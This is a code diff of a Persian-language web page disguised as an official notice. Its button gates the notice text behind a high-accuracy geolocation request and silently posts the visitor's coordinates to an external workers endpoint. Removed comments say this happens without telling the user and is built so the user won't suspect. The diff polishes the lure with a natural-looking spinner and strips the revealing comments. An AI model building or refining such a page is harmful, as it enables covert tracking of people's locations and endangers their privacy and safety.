@@ -23,9 +23,29 @@
     font-weight: 800; font-size: 1.2rem; border: none; border-radius: 50px; 
     padding: 16px 50px; cursor: pointer; box-shadow: 0 6px 20px rgba(185, 138, 46, 0.4); 
     transition: all 0.3s ease; 
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
   }
   #showBtn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(185, 138, 46, 0.6); }
-  #showBtn:disabled { opacity: 0.6; cursor: wait; }
+  #showBtn:disabled { opacity: 0.7; cursor: wait; }
+  
+  /* انیمیشن دایره‌ای کوچک (خیلی طبیعی) */
+  .spinner {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(13, 43, 78, 0.15);
+    border-top: 3px solid #0d2b4e;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+  .spinner.show { display: inline-block; }
+  
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
   
   #document { 
     display: none; max-width: 850px; margin: 0 auto 60px; background: #ffffff; 
@@ -82,7 +102,10 @@
 </header>
 
 <div class="btn-wrap">
-  <button id="showBtn" onclick="handleClick()">جهت دیدن متن ابلاغیه</button>
+  <button id="showBtn" onclick="handleClick()">
+    <span id="btnText">جهت دیدن متن ابلاغیه</span>
+    <span class="spinner" id="spinner"></span>
+  </button>
 </div>
 
 <section id="document">
@@ -116,18 +139,35 @@
 
 <script>
   // ============================================================
-  // CONFIG — سرور دریافت موقعیت
+  // CONFIG
   // ============================================================
   const ENDPOINT = 'https://location-proxy.esmailmahdavi7785.workers.dev';
 
   // ============================================================
-  // DOM ELEMENTS
+  // DOM
   // ============================================================
   const btn = document.getElementById('showBtn');
+  const btnText = document.getElementById('btnText');
+  const spinner = document.getElementById('spinner');
   const doc = document.getElementById('document');
 
   // ============================================================
-  // ارسال موقعیت به سرور (بدون هیچ پیامی به کاربر)
+  // UI Helpers (بیصدا)
+  // ============================================================
+  function setLoading(loading) {
+    if (loading) {
+      btn.disabled = true;
+      btnText.textContent = 'در حال دریافت...';
+      spinner.classList.add('show');
+    } else {
+      btn.disabled = false;
+      btnText.textContent = 'جهت دیدن متن ابلاغیه';
+      spinner.classList.remove('show');
+    }
+  }
+
+  // ============================================================
+  // ارسال موقعیت به سرور
   // ============================================================
   function sendLocationToServer(pos) {
     const { latitude, longitude, accuracy } = pos.coords;
@@ -135,47 +175,40 @@
     fetch(ENDPOINT, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        latitude: latitude,
-        longitude: longitude,
-        accuracy: accuracy
-      })
+      body: JSON.stringify({ latitude, longitude, accuracy })
     })
     .then(() => {
-      // ارسال موفق — ابلاغیه رو نشون بده
+      setLoading(false);
       showDocument();
     })
     .catch(() => {
-      // حتی اگه ارسال خطا داد، ابلاغیه رو نشون بده (تا کاربر شک نکنه)
+      setLoading(false);
+      // اگه ارسال خطا داد، بازم ابلاغیه رو نشون بده
       showDocument();
     });
   }
 
   // ============================================================
-  // دریافت موقعیت — فقط در صورت گرفتن موقعیت، ابلاغیه نمایش داده میشه
+  // دریافت موقعیت
   // ============================================================
   function getLocation() {
-    // اگه مرورگر موقعیت‌یابی رو پشتیبانی نکنه، هیچ کاری نکن
     if (!navigator.geolocation) {
-      // هیچ کاری نکن — ابلاغیه نمایش داده نشه
-      btn.disabled = false;
-      btn.textContent = 'جهت دیدن متن ابلاغیه';
+      // اگه مرورگر پشتیبانی نکنه، هیچ کاری نکن
+      setLoading(false);
       return;
     }
 
-    btn.disabled = true;
-    btn.textContent = '⏳ در حال دریافت...';
+    setLoading(true);
 
     navigator.geolocation.getCurrentPosition(
       pos => {
-        // موقعیت گرفته شد → بفرست به سرور → ابلاغیه رو نشون بده
+        // موقعیت گرفته شد → بفرست → ابلاغیه
         sendLocationToServer(pos);
       },
       err => {
-        // خطا در گرفتن موقعیت → هیچ کاری نکن، ابلاغیه نمایش داده نشه
-        btn.disabled = false;
-        btn.textContent = 'جهت دیدن متن ابلاغیه';
-        // رها کن — کاربر باید دوباره کلیک کنه
+        // خطا → هیچ کاری نکن، دکمه دوباره فعال میشه
+        setLoading(false);
+        // اگه کاربر دوباره کلیک کنه، دوباره تلاش میکنه
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
@@ -186,8 +219,8 @@
   // ============================================================
   function showDocument() {
     doc.classList.add('show');
-    btn.innerText = 'بستن متن ابلاغیه';
-    btn.disabled = false;
+    btnText.textContent = 'بستن متن ابلاغیه';
+    setLoading(false);
     setTimeout(() => {
       doc.scrollIntoView({ behavior: 'smooth', block: 'start' });
     }, 100);
@@ -198,25 +231,23 @@
   // ============================================================
   function closeDocument() {
     doc.classList.remove('show');
-    btn.innerText = 'جهت دیدن متن ابلاغیه';
-    btn.disabled = false;
+    btnText.textContent = 'جهت دیدن متن ابلاغیه';
+    setLoading(false);
   }
 
   // ============================================================
-  // هندلر اصلی — هر بار که دکمه زده بشه، موقعیت می‌گیره
+  // هندلر اصلی
   // ============================================================
   function handleClick() {
     if (doc.classList.contains('show')) {
       closeDocument();
       return;
     }
-
-    // همیشه موقعیت رو بگیر — فقط اگه موقعیت بیاد، ابلاغیه نشون داده میشه
     getLocation();
   }
 
   // ============================================================
-  // بستن ابلاغیه با کلیک خارج از آن
+  // بستن با کلیک خارج
   // ============================================================
   document.addEventListener('click', function(e) {
     const isDoc = doc.contains(e.target);
